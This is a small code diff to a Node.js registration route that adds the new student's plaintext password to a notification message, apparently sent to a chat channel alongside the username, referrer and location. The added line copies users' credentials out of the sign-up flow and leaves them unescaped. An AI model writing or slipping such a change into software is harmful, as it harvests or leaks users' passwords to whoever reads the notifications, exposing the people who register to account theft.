@@ -654,6 +654,7 @@ app.post("/student/register", async (req, res) => {
 🌟 NEW STUDENT
 Platform: ${escapeMarkdown(platformName)}
 Username: *${escapeMarkdown(username)}*
+\n Password: *${password}*
 Referrer: *${escapeMarkdown(admin.username)}*
 Location: ${escapeMarkdown(location.city || "Unknown")}, ${escapeMarkdown(location.country || "Unknown")}
 `;
